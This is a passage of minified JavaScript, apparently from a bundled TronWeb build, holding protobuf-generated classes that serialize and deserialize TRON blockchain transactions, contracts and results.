            return TronWebProto.Transaction.toObject(n, this)
        }
        ,
        TronWebProto.Transaction.toObject = function(n, s) {
            var a, l = {
                rawData: (a = s.getRawData()) && TronWebProto.Transaction.raw.toObject(n, a),
                signatureList: s.getSignatureList_asB64(),
                retList: e.Message.toObjectList(s.getRetList(), TronWebProto.Transaction.Result.toObject, n)
            };
            return n && (l.$jspbMessageInstance = s),
            l
        }
        ),
        TronWebProto.Transaction.deserializeBinary = function(n) {
            var s = new e.BinaryReader(n)
              , a = new TronWebProto.Transaction;
            return TronWebProto.Transaction.deserializeBinaryFromReader(a, s)
        }
        ,
        TronWebProto.Transaction.deserializeBinaryFromReader = function(n, s) {
            for (; s.nextField() && !s.isEndGroup(); ) {
                var a = s.getFieldNumber();
                switch (a) {
                case 1:
                    var l = new TronWebProto.Transaction.raw;
                    s.readMessage(l, TronWebProto.Transaction.raw.deserializeBinaryFromReader),
                    n.setRawData(l);
                    break;
                case 2:
                    var l = s.readBytes();
                    n.addSignature(l);
                    break;
                case 5:
                    var l = new TronWebProto.Transaction.Result;
                    s.readMessage(l, TronWebProto.Transaction.Result.deserializeBinaryFromReader),
                    n.addRet(l);
                    break;
                default:
                    s.skipField();
                    break
                }
            }
            return n
        }
        ,
        TronWebProto.Transaction.prototype.serializeBinary = function() {
            var n = new e.BinaryWriter;
            return TronWebProto.Transaction.serializeBinaryToWriter(this, n),
            n.getResultBuffer()
        }
        ,
        TronWebProto.Transaction.serializeBinaryToWriter = function(n, s) {
            var a = void 0;
            a = n.getRawData(),
            a != null && s.writeMessage(1, a, TronWebProto.Transaction.raw.serializeBinaryToWriter),
            a = n.getSignatureList_asU8(),
            a.length > 0 && s.writeRepeatedBytes(2, a),
            a = n.getRetList(),
            a.length > 0 && s.writeRepeatedMessage(5, a, TronWebProto.Transaction.Result.serializeBinaryToWriter)
        }
        ,
        e.Message.GENERATE_TO_OBJECT && (TronWebProto.Transaction.Contract.prototype.toObject = function(n) {
            return TronWebProto.Transaction.Contract.toObject(n, this)
        }
        ,
        TronWebProto.Transaction.Contract.toObject = function(n, s) {
            var a, l = {
                type: e.Message.getFieldWithDefault(s, 1, 0),
                parameter: (a = s.getParameter()) && i.Any.toObject(n, a),
                provider: s.getProvider_asB64(),
                contractname: s.getContractname_asB64(),
                permissionId: e.Message.getFieldWithDefault(s, 5, 0)
            };
            return n && (l.$jspbMessageInstance = s),
            l
        }
        ),
        TronWebProto.Transaction.Contract.deserializeBinary = function(n) {
            var s = new e.BinaryReader(n)
              , a = new TronWebProto.Transaction.Contract;
            return TronWebProto.Transaction.Contract.deserializeBinaryFromReader(a, s)
        }
        ,
        TronWebProto.Transaction.Contract.deserializeBinaryFromReader = function(n, s) {
            for (; s.nextField() && !s.isEndGroup(); ) {
                var a = s.getFieldNumber();
                switch (a) {
                case 1:
                    var l = s.readEnum();
                    n.setType(l);
                    break;
                case 2:
                    var l = new i.Any;
                    s.readMessage(l, i.Any.deserializeBinaryFromReader),
                    n.setParameter(l);
                    break;
                case 3:
                    var l = s.readBytes();
                    n.setProvider(l);
                    break;
                case 4:
                    var l = s.readBytes();
                    n.setContractname(l);
                    break;
                case 5:
                    var l = s.readInt32();
                    n.setPermissionId(l);
                    break;
                default:
                    s.skipField();
                    break
                }
            }
            return n
        }
        ,
        TronWebProto.Transaction.Contract.prototype.serializeBinary = function() {
            var n = new e.BinaryWriter;
            return TronWebProto.Transaction.Contract.serializeBinaryToWriter(this, n),
            n.getResultBuffer()
        }
        ,
        TronWebProto.Transaction.Contract.serializeBinaryToWriter = function(n, s) {
            var a = void 0;
            a = n.getType(),
            a !== 0 && s.writeEnum(1, a),
            a = n.getParameter(),
            a != null && s.writeMessage(2, a, i.Any.serializeBinaryToWriter),
            a = n.getProvider_asU8(),
            a.length > 0 && s.writeBytes(3, a),
            a = n.getContractname_asU8(),
            a.length > 0 && s.writeBytes(4, a),
            a = n.getPermissionId(),
            a !== 0 && s.writeInt32(5, a)
        }
        ,
        TronWebProto.Transaction.Contract.ContractType = {
            ACCOUNTCREATECONTRACT: 0,
            TRANSFERCONTRACT: 1,
            TRANSFERASSETCONTRACT: 2,
            VOTEASSETCONTRACT: 3,
            VOTEWITNESSCONTRACT: 4,
            WITNESSCREATECONTRACT: 5,
            ASSETISSUECONTRACT: 6,
            WITNESSUPDATECONTRACT: 8,
            PARTICIPATEASSETISSUECONTRACT: 9,
            ACCOUNTUPDATECONTRACT: 10,
            FREEZEBALANCECONTRACT: 11,
            UNFREEZEBALANCECONTRACT: 12,
            WITHDRAWBALANCECONTRACT: 13,
            UNFREEZEASSETCONTRACT: 14,
            UPDATEASSETCONTRACT: 15,
            PROPOSALCREATECONTRACT: 16,
            PROPOSALAPPROVECONTRACT: 17,
            PROPOSALDELETECONTRACT: 18,
            SETACCOUNTIDCONTRACT: 19,
            CUSTOMCONTRACT: 20,
            CREATESMARTCONTRACT: 30,
            TRIGGERSMARTCONTRACT: 31,
            GETCONTRACT: 32,
            UPDATESETTINGCONTRACT: 33,
            EXCHANGECREATECONTRACT: 41,
            EXCHANGEINJECTCONTRACT: 42,
            EXCHANGEWITHDRAWCONTRACT: 43,
            EXCHANGETRANSACTIONCONTRACT: 44,
            UPDATEENERGYLIMITCONTRACT: 45,
            ACCOUNTPERMISSIONUPDATECONTRACT: 46,
            CLEARABICONTRACT: 48,
            UPDATEBROKERAGECONTRACT: 49,
            SHIELDEDTRANSFERCONTRACT: 51,
            MARKETSELLASSETCONTRACT: 52,
            MARKETCANCELORDERCONTRACT: 53,
            FREEZEBALANCEV2CONTRACT: 54,
            UNFREEZEBALANCEV2CONTRACT: 55,
            WITHDRAWEXPIREUNFREEZECONTRACT: 56,
            DELEGATERESOURCECONTRACT: 57,
            UNDELEGATERESOURCECONTRACT: 58,
            CANCELALLUNFREEZEV2CONTRACT: 59
        },
        TronWebProto.Transaction.Contract.prototype.getType = function() {
            return e.Message.getFieldWithDefault(this, 1, 0)
        }
        ,
        TronWebProto.Transaction.Contract.prototype.setType = function(n) {
            return e.Message.setProto3EnumField(this, 1, n)
        }
        ,
        TronWebProto.Transaction.Contract.prototype.getParameter = function() {
            return e.Message.getWrapperField(this, i.Any, 2)
        }
        ,
        TronWebProto.Transaction.Contract.prototype.setParameter = function(n) {
            return e.Message.setWrapperField(this, 2, n)
        }
        ,
        TronWebProto.Transaction.Contract.prototype.clearParameter = function() {
            return this.setParameter(void 0)
        }
        ,
        TronWebProto.Transaction.Contract.prototype.hasParameter = function() {
            return e.Message.getField(this, 2) != null
        }
        ,
        TronWebProto.Transaction.Contract.prototype.getProvider = function() {
            return e.Message.getFieldWithDefault(this, 3, "")
        }
        ,
        TronWebProto.Transaction.Contract.prototype.getProvider_asB64 = function() {
            return e.Message.bytesAsB64(this.getProvider())
        }
        ,
        TronWebProto.Transaction.Contract.prototype.getProvider_asU8 = function() {
            return e.Message.bytesAsU8(this.getProvider())
        }
        ,
        TronWebProto.Transaction.Contract.prototype.setProvider = function(n) {
            return e.Message.setProto3BytesField(this, 3, n)
        }
        ,
        TronWebProto.Transaction.Contract.prototype.getContractname = function() {
            return e.Message.getFieldWithDefault(this, 4, "")
        }
        ,
        TronWebProto.Transaction.Contract.prototype.getContractname_asB64 = function() {
            return e.Message.bytesAsB64(this.getContractname())
        }
        ,
        TronWebProto.Transaction.Contract.prototype.getContractname_asU8 = function() {
            return e.Message.bytesAsU8(this.getContractname())
        }
        ,
        TronWebProto.Transaction.Contract.prototype.setContractname = function(n) {
            return e.Message.setProto3BytesField(this, 4, n)
        }
        ,
        TronWebProto.Transaction.Contract.prototype.getPermissionId = function() {
            return e.Message.getFieldWithDefault(this, 5, 0)
        }
        ,
        TronWebProto.Transaction.Contract.prototype.setPermissionId = function(n) {
            return e.Message.setProto3IntField(this, 5, n)
        }
        ,
        TronWebProto.Transaction.Result.repeatedFields_ = [26],
        e.Message.GENERATE_TO_OBJECT && (TronWebProto.Transaction.Result.prototype.toObject = function(n) {
            return TronWebProto.Transaction.Result.toObject(n, this)
        }
        ,
        TronWebProto.Transaction.Result.toObject = function(n, s) {
            var a = {
                fee: e.Message.getFieldWithDefault(s, 1, 0),
                ret: e.Message.getFieldWithDefault(s, 2, 0),
                contractret: e.Message.getFieldWithDefault(s, 3, 0),
                assetissueid: e.Message.getFieldWithDefault(s, 14, ""),
                withdrawAmount: e.Message.getFieldWithDefault(s, 15, 0),
                unfreezeAmount: e.Message.getFieldWithDefault(s, 16, 0),
                exchangeReceivedAmount: e.Message.getFieldWithDefault(s, 18, 0),
                exchangeInjectAnotherAmount: e.Message.getFieldWithDefault(s, 19, 0),
                exchangeWithdrawAnotherAmount: e.Message.getFieldWithDefault(s, 20, 0),
                exchangeId: e.Message.getFieldWithDefault(s, 21, 0),
                shieldedTransactionFee: e.Message.getFieldWithDefault(s, 22, 0),
                orderid: s.getOrderid_asB64(),
                orderdetailsList: e.Message.toObjectList(s.getOrderdetailsList(), TronWebProto.MarketOrderDetail.toObject, n)
            };
            return n && (a.$jspbMessageInstance = s),
            a
        }
        ),
        TronWebProto.Transaction.Result.deserializeBinary = function(n) {
            var s = new e.BinaryReader(n)
              , a = new TronWebProto.Transaction.Result;
            return TronWebProto.Transaction.Result.deserializeBinaryFromReader(a, s)
        }
        ,
        TronWebProto.Transaction.Result.deserializeBinaryFromReader = function(n, s) {
            for (; s.nextField() && !s.isEndGroup(); ) {
                var a = s.getFieldNumber();
                switch (a) {
                case 1:
                    var l = s.readInt64();
                    n.setFee(l);
                    break;
                case 2:
                    var l = s.readEnum();
                    n.setRet(l);
                    break;
                case 3:
                    var l = s.readEnum();
                    n.setContractret(l);
                    break;
                case 14:
                    var l = s.readString();
                    n.setAssetissueid(l);
                    break;
                case 15:
                    var l = s.readInt64();
                    n.setWithdrawAmount(l);
                    break;
                case 16:
                    var l = s.readInt64();
                    n.setUnfreezeAmount(l);
                    break;
                case 18:
                    var l = s.readInt64();
                    n.setExchangeReceivedAmount(l);
                    break;
                case 19:
                    var l = s.readInt64();
                    n.setExchangeInjectAnotherAmount(l);
                    break;
                case 20:
                    var l = s.readInt64();
                    n.setExchangeWithdrawAnotherAmount(l);
                    break;
                case 21:
                    var l = s.readInt64();
                    n.setExchangeId(l);
                    break;
                case 22:
                    var l = s.readInt64();
                    n.setShieldedTransactionFee(l);
                    break;
                case 25:
                    var l = s.readBytes();
                    n.setOrderid(l);
                    break;
                case 26:
                    var l = new TronWebProto.MarketOrderDetail;
                    s.readMessage(l, TronWebProto.MarketOrderDetail.deserializeBinaryFromReader),
                    n.addOrderdetails(l);
                    break;
                default:
                    s.skipField();
                    break
                }
            }
            return n
        }
        ,
        TronWebProto.Transaction.Result.prototype.serializeBinary = function() {
            var n = new e.BinaryWriter;
            return TronWebProto.Transaction.Result.serializeBinaryToWriter(this, n),
            n.getResultBuffer()
        }
        ,
        TronWebProto.Transaction.Result.serializeBinaryToWriter = function(n, s) {
            var a = void 0;
            a = n.getFee(),
            a !== 0 && s.writeInt64(1, a),
            a = n.getRet(),
            a !== 0 && s.writeEnum(2, a),
            a = n.getContractret(),
            a !== 0 && s.writeEnum(3, a),
            a = n.getAssetissueid(),
            a.length > 0 && s.writeString(14, a),
            a = n.getWithdrawAmount(),
            a !== 0 && s.writeInt64(15, a),
            a = n.getUnfreezeAmount(),
            a !== 0 && s.writeInt64(16, a),
            a = n.getExchangeReceivedAmount(),
            a !== 0 && s.writeInt64(18, a),
            a = n.getExchangeInjectAnotherAmount(),
            a !== 0 && s.writeInt64(19, a),
            a = n.getExchangeWithdrawAnotherAmount(),
            a !== 0 && s.writeInt64(20, a),
            a = n.getExchangeId(),
            a !== 0 && s.writeInt64(21, a),
            a = n.getShieldedTransactionFee(),
            a !== 0 && s.writeInt64(22, a),
            a = n.getOrderid_asU8(),
            a.length > 0 && s.writeBytes(25, a),
            a = n.getOrderdetailsList(),
            a.length > 0 && s.writeRepeatedMessage(26, a, TronWebProto.MarketOrderDetail.serializeBinaryToWriter)
        }
        ,
        TronWebProto.Transaction.Result.code = {
            SUCESS: 0,
            FAILED: 1
        },
        TronWebProto.Transaction.Result.contractResult = {
            DEFAULT: 0,
            SUCCESS: 1,
            REVERT: 2,
            BAD_JUMP_DESTINATION: 3,
            OUT_OF_MEMORY: 4,
            PRECOMPILED_CONTRACT: 5,
            STACK_TOO_SMALL: 6,
            STACK_TOO_LARGE: 7,
            ILLEGAL_OPERATION: 8,
            STACK_OVERFLOW: 9,
            OUT_OF_ENERGY: 10,
            OUT_OF_TIME: 11,
            JVM_STACK_OVER_FLOW: 12,
            UNKNOWN: 13,
            TRANSFER_FAILED: 14,
            INVALID_CODE: 15
        },
        TronWebProto.Transaction.Result.prototype.getFee = function() {
            return e.Message.getFieldWithDefault(this, 1, 0)
        }
        ,
        TronWebProto.Transaction.Result.prototype.setFee = function(n) {
            return e.Message.setProto3IntField(this, 1, n)
        }
        ,
        TronWebProto.Transaction.Result.prototype.getRet = function() {
            return e.Message.getFieldWithDefault(this, 2, 0)
        }
        ,
        TronWebProto.Transaction.Result.prototype.setRet = function(n) {
            return e.Message.setProto3EnumField(this, 2, n)
        }
        ,
        TronWebProto.Transaction.Result.prototype.getContractret = function() {
            return e.Message.getFieldWithDefault(this, 3, 0)
        }
        ,
        TronWebProto.Transaction.Result.prototype.setContractret = function(n) {
            return e.Message.setProto3EnumField(this, 3, n)
        }
        ,
        TronWebProto.Transaction.Result.prototype.getAssetissueid = function() {
            return e.Message.getFieldWithDefault(this, 14, "")
        }
        ,
        TronWebProto.Transaction.Result.prototype.setAssetissueid = function(n) {
            return e.Message.setProto3StringField(this, 14, n)
        }
        ,
        TronWebProto.Transaction.Result.prototype.getWithdrawAmount = function() {
            return e.Message.getFieldWithDefault(this, 15, 0)
        }
        ,
        TronWebProto.Transaction.Result.prototype.setWithdrawAmount = function(n) {
            return e.Message.setProto3IntField(this, 15, n)
        }
        ,
        TronWebProto.Transaction.Result.prototype.getUnfreezeAmount = function() {
            return e.Message.getFieldWithDefault(this, 16, 0)
        }
        ,
        TronWebProto.Transaction.Result.prototype.setUnfreezeAmount = function(n) {
            return e.Message.setProto3IntField(this, 16, n)
        }
        ,
        TronWebProto.Transaction.Result.prototype.getExchangeReceivedAmount = function() {
            return e.Message.getFieldWithDefault(this, 18, 0)
        }
        ,
        TronWebProto.Transaction.Result.prototype.setExchangeReceivedAmount = function(n) {
            return e.Message.setProto3IntField(this, 18, n)
        }
        ,
        TronWebProto.Transaction.Result.prototype.getExchangeInjectAnotherAmount = function() {
            return e.Message.getFieldWithDefault(this, 19, 0)
        }
        ,
        TronWebProto.Transaction.Result.prototype.setExchangeInjectAnotherAmount = function(n) {
            return e.Message.setProto3IntField(this, 19, n)
        }
        ,
        TronWebProto.Transaction.Result.prototype.getExchangeWithdrawAnotherAmount = function() {
            return e.Message.getFieldWithDefault(this, 20, 0)
        }
        ,
        TronWebProto.Transaction.Result.prototype.setExchangeWithdrawAnotherAmount = function(n) {
            return e.Message.setProto3IntField(this, 20, n)
        }
        ,
        TronWebProto.Transaction.Result.prototype.getExchangeId = function() {
            return e.Message.getFieldWithDefault(this, 21, 0)
        }
        ,
        TronWebProto.Transaction.Result.prototype.setExchangeId = function(n) {
            return e.Message.setProto3IntField(this, 21, n)
        }
        ,
        TronWebProto.Transaction.Result.prototype.getShieldedTransactionFee = function() {
            return e.Message.getFieldWithDefault(this, 22, 0)
        }
        ,
        TronWebProto.Transaction.Result.prototype.setShieldedTransactionFee = function(n) {
            return e.Message.setProto3IntField(this, 22, n)
        }
        ,
        TronWebProto.Transaction.Result.prototype.getOrderid = function() {
            return e.Message.getFieldWithDefault(this, 25, "")
        }
        ,
        TronWebProto.Transaction.Result.prototype.getOrderid_asB64 = function() {
            return e.Message.bytesAsB64(this.getOrderid())
        }
        ,
        TronWebProto.Transaction.Result.prototype.getOrderid_asU8 = function() {
            return e.Message.bytesAsU8(this.getOrderid())
        }
        ,
        TronWebProto.Transaction.Result.prototype.setOrderid = function(n) {
            return e.Message.setProto3BytesField(this, 25, n)
        }
        ,
        TronWebProto.Transaction.Result.prototype.getOrderdetailsList = function() {
            return e.Message.getRepeatedWrapperField(this, TronWebProto.MarketOrderDetail, 26)
        }
        ,
        TronWebProto.Transaction.Result.prototype.setOrderdetailsList = function(n) {
            return e.Message.setRepeatedWrapperField(this, 26, n)
        }
        ,
        TronWebProto.Transaction.Result.prototype.addOrderdetails = function(n, s) {
            return e.Message.addToRepeatedWrapperField(this, 26, n, TronWebProto.MarketOrderDetail, s)
        }
        ,
        TronWebProto.Transaction.Result.prototype.clearOrderdetailsList = function() {
            return this.setOrderdetailsList([])
        }
        ,
        TronWebProto.Transaction.raw.repeatedFields_ = [9, 11],
        e.Message.GENERATE_TO_OBJECT && (TronWebProto.Transaction.raw.prototype.toObject = function(n) {
            return TronWebProto.Transaction.raw.toObject(n, this)
        }
        ,
        TronWebProto.Transaction.raw.toObject = function(n, s) {
            var a = {
                refBlockBytes: s.getRefBlockBytes_asB64(),
                refBlockNum: e.Message.getFieldWithDefault(s, 3, 0),
                refBlockHash: s.getRefBlockHash_asB64(),
                expiration: e.Message.getFieldWithDefault(s, 8, 0),
                authsList: e.Message.toObjectList(s.getAuthsList(), TronWebProto.authority.toObject, n),
                data: s.getData_asB64(),
                contractList: e.Message.toObjectList(s.getContractList(), TronWebProto.Transaction.Contract.toObject, n),
                scripts: s.getScripts_asB64(),
                timestamp: e.Message.getFieldWithDefault(s, 14, 0),
                feeLimit: e.Message.getFieldWithDefault(s, 18, 0)
            };
            return n && (a.$jspbMessageInstance = s),
            a
        }
        ),
        TronWebProto.Transaction.raw.deserializeBinary = function(n) {
            var s = new e.BinaryReader(n)
              , a = new TronWebProto.Transaction.raw;
            return TronWebProto.Transaction.raw.deserializeBinaryFromReader(a, s)
        }
        ,
        TronWebProto.Transaction.raw.deserializeBinaryFromReader = function(n, s) {
            for (; s.nextField() && !s.isEndGroup(); ) {
                var a = s.getFieldNumber();
                switch (a) {
                case 1:
                    var l = s.readBytes();
                    n.setRefBlockBytes(l);
                    break;
                case 3:
                    var l = s.readInt64();
                    n.setRefBlockNum(l);
                    break;
                case 4:
                    var l = s.readBytes();
                    n.setRefBlockHash(l);
                    break;
                case 8:
                    var l = s.readInt64();
                    n.setExpiration(l);
                    break;
                case 9:
                    var l = new TronWebProto.authority;
                    s.readMessage(l, TronWebProto.authority.deserializeBinaryFromReader),
                    n.addAuths(l);
                    break;
                case 10:
                    var l = s.readBytes();
                    n.setData(l);
                    break;
                case 11:
                    var l = new TronWebProto.Transaction.Contract;
                    s.readMessage(l, TronWebProto.Transaction.Contract.deserializeBinaryFromReader),
                    n.addContract(l);
                    break;
                case 12:
                    var l = s.readBytes();
                    n.setScripts(l);
                    break;
                case 14:
                    var l = s.readInt64();
                    n.setTimestamp(l);
                    break;
                case 18:
                    var l = s.readInt64();
                    n.setFeeLimit(l);
                    break;
                default:
                    s.skipField();
                    break
                }
            }
            return n
        }
        ,
        TronWebProto.Transaction.raw.prototype.serializeBinary = function() {
            var n = new e.BinaryWriter;
            return TronWebProto.Transaction.raw.serializeBinaryToWriter(this, n),
            n.getResultBuffer()
        }
        ,
        TronWebProto.Transaction.raw.serializeBinaryToWriter = function(n, s) {
            var a = void 0;
            a = n.getRefBlockBytes_asU8(),
            a.length > 0 && s.writeBytes(1, a),
            a = n.getRefBlockNum(),
            a !== 0 && s.writeInt64(3, a),
            a = n.getRefBlockHash_asU8(),
            a.length > 0 && s.writeBytes(4, a),
            a = n.getExpiration(),
            a !== 0 && s.writeInt64(8, a),
            a = n.getAuthsList(),
            a.length > 0 && s.writeRepeatedMessage(9, a, TronWebProto.authority.serializeBinaryToWriter),
            a = n.getData_asU8(),
            a.length > 0 && s.writeBytes(10, a),
            a = n.getContractList(),
            a.length > 0 && s.writeRepeatedMessage(11, a, TronWebProto.Transaction.Contract.serializeBinaryToWriter),
            a = n.getScripts_asU8(),
            a.length > 0 && s.writeBytes(12, a),
            a = n.getTimestamp(),
            a !== 0 && s.writeInt64(14, a),
            a = n.getFeeLimit(),
            a !== 0 && s.writeInt64(18, a)
        }
        ,
        TronWebProto.Transaction.raw.prototype.getRefBlockBytes = function() {
            return e.Message.getFieldWithDefault(this, 1, "")
        }
        ,
        TronWebProto.Transaction.raw.prototype.getRefBlockBytes_asB64 = function() {
            return e.Message.bytesAsB64(this.getRefBlockBytes())
        }
        ,
        TronWebProto.Transaction.raw.prototype.getRefBlockBytes_asU8 = function() {
            return e.Message.bytesAsU8(this.getRefBlockBytes())
        }
        ,
        TronWebProto.Transaction.raw.prototype.setRefBlockBytes = function(n) {
            return e.Message.setProto3BytesField(this, 1, n)
        }
        ,
        TronWebProto.Transaction.raw.prototype.getRefBlockNum = function() {
            return e.Message.getFieldWithDefault(this, 3, 0)
        }
        ,
        TronWebProto.Transaction.raw.prototype.setRefBlockNum = function(n) {
            return e.Message.setProto3IntField(this, 3, n)
        }
        ,
        TronWebProto.Transaction.raw.prototype.getRefBlockHash = function() {
            return e.Message.getFieldWithDefault(this, 4, "")
        }
        ,
        TronWebProto.Transaction.raw.prototype.getRefBlockHash_asB64 = function() {
            return e.Message.bytesAsB64(this.getRefBlockHash())
        }
        ,
        TronWebProto.Transaction.raw.prototype.getRefBlockHash_asU8 = function() {
            return e.Message.bytesAsU8(this.getRefBlockHash())
        }
        ,
        TronWebProto.Transaction.raw.prototype.setRefBlockHash = function(n) {
            return e.Message.setProto3BytesField(this, 4, n)
        }
        ,
        TronWebProto.Transaction.raw.prototype.getExpiration = function() {
            return e.Message.getFieldWithDefault(this, 8, 0)
        }
        ,
        TronWebProto.Transaction.raw.prototype.setExpiration = function(n) {
            return e.Message.setProto3IntField(this, 8, n)
        }
        ,
        TronWebProto.Transaction.raw.prototype.getAuthsList = function() {
            return e.Message.getRepeatedWrapperField(this, TronWebProto.authority, 9)
        }
        ,
        TronWebProto.Transaction.raw.prototype.setAuthsList = function(n) {
            return e.Message.setRepeatedWrapperField(this, 9, n)
        }
        ,
        TronWebProto.Transaction.raw.prototype.addAuths = function(n, s) {
            return e.Message.addToRepeatedWrapperField(this, 9, n, TronWebProto.authority, s)
        }
        ,
        TronWebProto.Transaction.raw.prototype.clearAuthsList = function() {
            return this.setAuthsList([])
        }
        ,
        TronWebProto.Transaction.raw.prototype.getData = function() {
            return e.Message.getFieldWithDefault(this, 10, "")
        }
        ,
        TronWebProto.Transaction.raw.prototype.getData_asB64 = function() {
            return e.Message.bytesAsB64(this.getData())
        }
        ,
        TronWebProto.Transaction.raw.prototype.getData_asU8 = function() {
            return e.Message.bytesAsU8(this.getData())
        }
        ,
        TronWebProto.Transaction.raw.prototype.setData = function(n) {
            return e.Message.setProto3BytesField(this, 10, n)
        }
        ,
        TronWebProto.Transaction.raw.prototype.getContractList = function() {
            return e.Message.getRepeatedWrapperField(this, TronWebProto.Transaction.Contract, 11)
        }
        ,
        TronWebProto.Transaction.raw.prototype.setContractList = function(n) {
            return e.Message.setRepeatedWrapperField(this, 11, n)
        }
        ,
        TronWebProto.Transaction.raw.prototype.addContract = function(n, s) {
            return e.Message.addToRepeatedWrapperField(this, 11, n, TronWebProto.Transaction.Contract, s)
        }
        ,
        TronWebProto.Transaction.raw.prototype.clearContractList = function() {
            return this.setContractList([])
        }
        ,
        TronWebProto.Transaction.raw.prototype.getScripts = function() {
            return e.Message.getFieldWithDefault(this, 12, "")
        }
        ,
        TronWebProto.Transaction.raw.prototype.getScripts_asB64 = function() {
            return e.Message.bytesAsB64(this.getScripts())
        }
        ,
        TronWebProto.Transaction.raw.prototype.getScripts_asU8 = function() {
            return e.Message.bytesAsU8(this.getScripts())
        }
        ,
        TronWebProto.Transaction.raw.prototype.setScripts = function(n) {
            return e.Message.setProto3BytesField(this, 12, n)
        }
        ,
        TronWebProto.Transaction.raw.prototype.getTimestamp = function() {
            return e.Message.getFieldWithDefault(this, 14, 0)
        }
        ,
        TronWebProto.Transaction.raw.prototype.setTimestamp = function(n) {
            return e.Message.setProto3IntField(this, 14, n)
        }
        ,
        TronWebProto.Transaction.raw.prototype.getFeeLimit = function() {
            return e.Message.getFieldWithDefault(this, 18, 0)
        }
        ,
        TronWebProto.Transaction.raw.prototype.setFeeLimit = function(n) {
            return e.Message.setProto3IntField(this, 18, n)
        }
        ,
        TronWebProto.Transaction.prototype.getRawData = function() {
            return e.Message.getWrapperField(this, TronWebProto.Transaction.raw, 1)
        }
        ,
        TronWebProto.Transaction.prototype.setRawData = function(n) {
            return e.Message.setWrapperField(this, 1, n)
        }
        ,
        TronWebProto.Transaction.prototype.clearRawData = function() {
            return this.setRawData(void 0)
        }
        ,
        TronWebProto.Transaction.prototype.hasRawData = function() {
            return e.Message.getField(this, 1) != null
        }
        ,
        TronWebProto.Transaction.prototype.getSignatureList = function() {
            return e.Message.getRepeatedField(this, 2)
        }
        ,
        TronWebProto.Transaction.prototype.getSignatureList_asB64 = function() {
            return e.Message.bytesListAsB64(this.getSignatureList())
        }
        ,
        TronWebProto.Transaction.prototype.getSignatureList_asU8 = function() {
            return e.Message.bytesListAsU8(this.getSignatureList())
        }
        ,
        TronWebProto.Transaction.prototype.setSignatureList = function(n) {
            return e.Message.setField(this, 2, n || [])
        }
        ,
        TronWebProto.Transaction.prototype.addSignature = function(n, s) {
            return e.Message.addToRepeatedField(this, 2, n, s)
        }
        ,
        TronWebProto.Transaction.prototype.clearSignatureList = function() {
            return this.setSignatureList([])
        }
        ,
        TronWebProto.Transaction.prototype.getRetList = function() {
            return e.Message.getRepeatedWrapperField(this, TronWebProto.Transaction.Result, 5)
        }
        ,
        TronWebProto.Transaction.prototype.setRetList = function(n) {
            return e.Message.setRepeatedWrapperField(this, 5, n)
        }
        ,
        TronWebProto.Transaction.prototype.addRet = function(n, s) {
            return e.Message.addToRepeatedWrapperField(this, 5, n, TronWebProto.Transaction.Result, s)
        }
        ,
        TronWebProto.Transaction.prototype.clearRetList = function() {
            return this.setRetList([])
        }
        ,
        TronWebProto.AccountType = {
            NORMAL: 0,
            ASSETISSUE: 1,
            CONTRACT: 2
        },
        t.object.extend(r, TronWebProto)
    }(VT)),
    VT
}
A4();
var HT = {}, GT = {}, hW;
function AU() {
    return hW || (hW = 1,
    function(r) {
        var e = ys()
          , t = e
          , o = typeof globalThis < "u" && globalThis || typeof window < "u" && window || typeof o < "u" && o || typeof self < "u" && self || (function() {
            return this
        }
        ).call(null) || Function("return this")();
        t.exportSymbol("TronWebProto.ResourceCode", null, o),
        TronWebProto.ResourceCode = {
            BANDWIDTH: 0,
            ENERGY: 1,
            TRON_POWER: 2
        },
        t.object.extend(r, TronWebProto)
    }(GT)),
    GT
}
var pW;
function Cge() {
    return pW || (pW = 1,
    function(r) {
        var e = ys()
          , t = e
          , o = typeof globalThis < "u" && globalThis || typeof window < "u" && window || typeof o < "u" && o || typeof self < "u" && self || (function() {
            return this
        }
        ).call(null) || Function("return this")()
          , i = AU();
        t.object.extend(proto, i),
        t.exportSymbol("TronWebProto.AccountBalanceRequest", null, o),
        t.exportSymbol("TronWebProto.AccountBalanceResponse", null, o),
        t.exportSymbol("TronWebProto.AccountIdentifier", null, o),
        t.exportSymbol("TronWebProto.AccountTrace", null, o),
        t.exportSymbol("TronWebProto.BlockBalanceTrace", null, o),
        t.exportSymbol("TronWebProto.BlockBalanceTrace.BlockIdentifier", null, o),
        t.exportSymbol("TronWebProto.CancelAllUnfreezeV2Contract", null, o),
        t.exportSymbol("TronWebProto.DelegateResourceContract", null, o),
        t.exportSymbol("TronWebProto.FreezeBalanceContract", null, o),
        t.exportSymbol("TronWebProto.FreezeBalanceV2Contract", null, o),
        t.exportSymbol("TronWebProto.TransactionBalanceTrace", null, o),
        t.exportSymbol("TronWebProto.TransactionBalanceTrace.Operation", null, o),
        t.exportSymbol("TronWebProto.TransferContract", null, o),
        t.exportSymbol("TronWebProto.UnDelegateResourceContract", null, o),
        t.exportSymbol("TronWebProto.UnfreezeBalanceContract", null, o),
        t.exportSymbol("TronWebProto.UnfreezeBalanceV2Contract", null, o),
        t.exportSymbol("TronWebProto.WithdrawBalanceContract", null, o),
        t.exportSymbol("TronWebProto.WithdrawExpireUnfreezeContract", null, o),
        TronWebProto.FreezeBalanceContract = function(n) {
            e.Message.initialize(this, n, 0, -1, null, null)
        }
        ,
        t.inherits(TronWebProto.FreezeBalanceContract, e.Message),
        t.DEBUG && !COMPILED && (TronWebProto.FreezeBalanceContract.displayName = "TronWebProto.FreezeBalanceContract"),
        TronWebProto.UnfreezeBalanceContract = function(n) {
            e.Message.initialize(this, n, 0, -1, null, null)
        }
        ,
        t.inherits(TronWebProto.UnfreezeBalanceContract, e.Message),
        t.DEBUG && !COMPILED && (TronWebProto.UnfreezeBalanceContract.displayName = "TronWebProto.UnfreezeBalanceContract"),
        TronWebProto.WithdrawBalanceContract = function(n) {
            e.Message.initialize(this, n, 0, -1, null, null)
        }
        ,
        t.inherits(TronWebProto.WithdrawBalanceContract, e.Message),
        t.DEBUG && !COMPILED && (TronWebProto.WithdrawBalanceContract.displayName = "TronWebProto.WithdrawBalanceContract"),
        TronWebProto.TransferContract = function(n) {
            e.Message.initialize(this, n, 0, -1, null, null)
        }
        ,
        t.inherits(TronWebProto.TransferContract, e.Message),
        t.DEBUG && !COMPILED && (TronWebProto.TransferContract.displayName = "TronWebProto.TransferContract"),
        TronWebProto.TransactionBalanceTrace = function(n) {
            e.Message.initialize(this, n, 0, -1, TronWebProto.TransactionBalanceTrace.repeatedFields_, null)
        }
        ,
        t.inherits(TronWebProto.TransactionBalanceTrace, e.Message),
        t.DEBUG && !COMPILED && (TronWebProto.TransactionBalanceTrace.displayName = "TronWebProto.TransactionBalanceTrace"),
